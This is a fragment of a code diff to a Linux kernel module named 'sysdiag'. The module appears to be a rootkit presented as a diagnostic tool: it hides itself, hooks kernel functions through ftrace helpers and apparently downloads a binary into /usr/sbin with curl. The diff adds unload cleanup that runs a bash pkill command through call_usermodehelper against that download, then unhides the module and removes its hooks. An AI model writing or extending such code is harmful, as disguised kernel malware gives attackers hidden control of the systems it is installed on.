@@ -55,16 +55,27 @@ static int __init sysdiag_init(void)
 
 static void __exit sysdiag_exit(void)
 {
+    atomic_set(&unloading, 1);
+
     if (mon_it) {
         kthread_stop(mon_it);
         mon_it = NULL;
-        msleep(100);          /* drain: let any in-flight usermodehelper unwind */
+    }
+
+    {
+        char *killargv[] = { "/bin/bash", "-c",
+            "pkill -9 -f 'curl -so /usr/sbin/sysdiag'", NULL };
+        static char *envp[] = { "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+        call_usermodehelper(killargv[0], killargv, envp, UMH_WAIT_PROC);
     }
 
     if (hidden)
         showme();
 
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+
+
+    msleep(1000);
 }
 
 MODULE_LICENSE("GPL");
